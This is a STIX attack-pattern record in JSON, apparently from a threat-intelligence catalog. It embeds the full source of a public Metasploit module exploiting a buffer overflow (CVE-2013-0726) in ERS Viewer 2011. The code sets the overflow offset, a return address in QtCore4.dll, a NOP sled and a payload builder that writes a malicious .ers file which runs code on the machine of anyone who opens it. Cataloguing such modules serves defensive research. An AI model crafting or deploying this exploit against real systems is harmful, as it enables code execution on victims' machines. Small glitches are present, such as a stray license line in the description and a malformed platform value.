{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a4d0322f-5aa4-482b-a5a4-e2635dccfdab",
    "created": "2024-08-14T16:37:41.124747Z",
    "modified": "2024-08-14T16:37:41.124752Z",
    "name": "\"ERS Viewer 2011 ERS File Handling Buffer Overflow\"",
    "description": " This module exploits a buffer overflow vulnerability found in ERS Viewer 2011 (version 11.04). The vulnerability exists in the module ermapper_u.dll where the function ERM_convert_to_correct_webpath handles user provided data in an insecure way. It results in arbitrary code execution under the context of the user viewing a specially crafted .ers file. This module has been tested successfully with ERS Viewer 2011 (version 11.04) on Windows XP SP3 and Windows 7 SP1.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/erdas_er_viewer_bof.rb",
            "external_id": "erdas_er_viewer_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-0726"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20130515231047/http://secunia.com/advisories/51725/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"ERS Viewer 2011 ERS File Handling Buffer Overflow\",\n      'Description'    => %q{\n          This module exploits a buffer overflow vulnerability found in ERS Viewer 2011\n        (version 11.04). The vulnerability exists in the module ermapper_u.dll where the\n        function ERM_convert_to_correct_webpath handles user provided data in an insecure\n        way. It results in arbitrary code execution under the context of the user viewing\n        a specially crafted .ers file. This module has been tested successfully with ERS\n        Viewer 2011 (version 11.04) on Windows XP SP3 and Windows 7 SP1.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Parvez Anwar', # Vulnerability Discovery\n          'juan vazquez' # Metasploit\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2013-0726' ],\n          [ 'OSVDB', '92694' ],\n          [ 'BID', '59379' ],\n          [ 'URL', 'http://web.archive.org/web/20130515231047/http://secunia.com/advisories/51725/' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 7516,\n          'BadChars' => \"\\x22\\x5c\" +\n            (0x7f..0xff).to_a.pack(\"C*\") +\n            (0x00..0x08).to_a.pack(\"C*\") +\n            (0x0a..0x1f).to_a.pack(\"C*\"),\n          'DisableNops' => true,\n          'EncoderOptions' =>\n            {\n              'BufferRegister' => 'ESP'\n            }\n        },\n      'SaveRegisters'  => [ 'ESP' ],\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'ERS Viewer 2011 (v11.04)  / Windows XP SP3 / Windows 7 SP1',\n            {\n              'Offset' => 260,\n              'Ret' => 0x67097d7a # push esp # ret 0x08 from QtCore4.dll\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-04-23',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.ers']),\n      ])\n\n  end\n\n  # Rewrote it because make_nops is ignoring SaveRegisters\n  # and corrupting ESP.\n  def make_nops(count)\n    return \"\\x43\" * count # 0x43 => inc ebx\n  end\n\n  def exploit\n\n    buf = rand_text(target['Offset'])\n    buf << [target.ret].pack(\"V\")\n    buf << make_nops(8) # In order to keep ESP pointing to the start of the shellcode\n    buf << payload.encoded\n\n    ers = %Q|\nDatasetHeader Begin\n  Name\t\t= \"#{buf}\"\nDatasetHeader End\n    |\n\n    file_create(ers)\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-04-23",
    "x_mitre_platforms": [
        "win'"
    ]
}